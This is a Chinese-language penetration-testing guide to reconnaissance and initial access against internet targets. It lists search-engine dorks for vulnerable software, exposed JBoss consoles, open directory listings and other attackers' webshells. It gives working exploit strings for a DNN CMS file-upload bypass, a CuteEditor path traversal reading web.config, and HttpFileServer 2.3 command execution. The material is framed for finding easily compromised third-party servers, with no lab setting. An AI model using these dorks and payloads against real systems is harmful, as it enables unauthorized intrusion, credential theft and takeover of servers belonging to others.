# 渗透测试-信息收集
## 0x01 Introduction
>对于互联网上的网络目标信息收集，我往往希望找到一个和目标系统在同LAN的，并容易控守的服务器，甚至就是同一台服务器的应用漏洞，所以相关度、可控守难度两个属性就至关重要了。

现阶段的信息获取方式是，首先要锁定我们的最终目标，如果目标无法攻破，通过迂回包抄的方法。一是要关注同服务器其他应用，二是依照外网IP段和子域名相近性类推相关度，一层层向外拓展，直到找到可控守的目标进行内网拓展。

## 0x02 思路

1. 快速模式，快速找到漏洞点利用突破外网，进行内网渗透。
2. 普通模式，寻寻渐进进行普遍性收集，漏洞测试，寻找最优路径突破外网，进行内网渗透。

### 快速模式

无论运用什么方式进行网络目标信息收集，我们首先就是要确定目标的网络的身份信息，也就是其域名、IP地址。   
通常情况下子域名应用与终极目标相关性高，同C段IP的应用有较高的相关性，需要进行判断。   

为了快速找到可攻破的目标，我们需要借助搜索引擎。   
信息获取的方法遵循快速有效，所以一般先通过，Google，zoomeye等搜索引擎利用技巧，快速查找相关应用（子域名和C段IP）是否存在易控守的漏洞。   （sturts2、Jboss、fckeditor等），进行突破。   
#### 1.GoogleHack   
- 思路一：查找易获取控制权限的漏洞查找，struts（s2-016...）、editor
- 思路二：找Hacked的网站，或者webshell
- 思路三：配置错误，可列目录或报错信息，这样获取更权限信息。
- 思路四：Admin后台。

#### 案例：   
##### DNN CMS   
搜索规则：`inurl:Portals/0/`

EXP: 
```
http://[PATH]/Providers/HtmlEditorProviders/Fck/fcklinkgallery.aspx
通过js调用上传功能： javascript:__doPostBack('ctlURL$cmdUpload','')
上传文件(存在asp解析漏洞)：Dz4aLL.asp;me.jpg
UploadRoot:Portals/0/
```

##### FCKEditor
>搜索规则：fckeitor

##### CuteEditor
>搜索规则： `inurl:CuteSoft_Client/`
EXP:   
```
CuteSoft_Client/CuteEditor/Load.ashx?type=image&file=../../../web.config
```

##### HttpFileServer
>搜索规则：  
intext:Servertime: HttpFileServer 2.3
intext:服务器时间: HttpFileServer 2.3

EXP:   
```
http://localhost:8080/?search==%00{.exec|cmd.exe /c  echo 123 > C:\1.txt.}
ttp://localhost:8080/?search==%00{.load|c:\1.txt.}
```

##### JBoss
>搜索规则：
inurl:status EJBInvokerServlet   
intitle:"tomcat status"   
inurl:jmx-console   
/invoker/JMXInvokerServlet   
status?full=true   
intitle:"tomcat status"  intext:"jbossupdate"   (webinfo console jsp_info.jsp log_info.jsp)   
/invoker/JMXInvokerServlet   
jmx-console   
web-console   


##### 列目录
>搜索规则：   
intext:转到父目录   
intitle:index of /   

##### 搜索别人的shell
>搜索规则：   
intitle:Phantom Hackers.PH intext:password filetype:php

#### 2.Zoomeye
要学会几个关键词的使用，icdr、country、app等

## 普通模式
锁定目标的网络位置（域名、IP地址），我就要开始逐渐拓展相关目标范围，并进行深度有效的信息收集。
### (1)拓展网络目标范围
以点拓面
1. 同服务器其它Web应用
2. 主页链接网站
3. 子域名（2、3...级）
4. C段主机（或已知目标的IP段）
5. 移动App分析获取服务器地址
### (2)获取基本信息
1. 位置信息（IP地址、域名）
2. 扫描开放端口、服务及版本
### (3)深度挖掘信息
1. 识别设备类型
2. 识别操作系统
3. 识别Web容器
4. 识别Web应用(CMS)、组件及其版本
### (4)漏洞测试
1. 已知漏洞测试
- Web
- Databse（Mysql、SQLserver）
- 远程管理（SSH、RDP）
2. 常见漏洞测试（主要是Web方向）
- 弱口令（常见的默认密码）
- SQLinject
- 文件包含
- 文件上传过滤不严格
- 模板注入
- 模板管理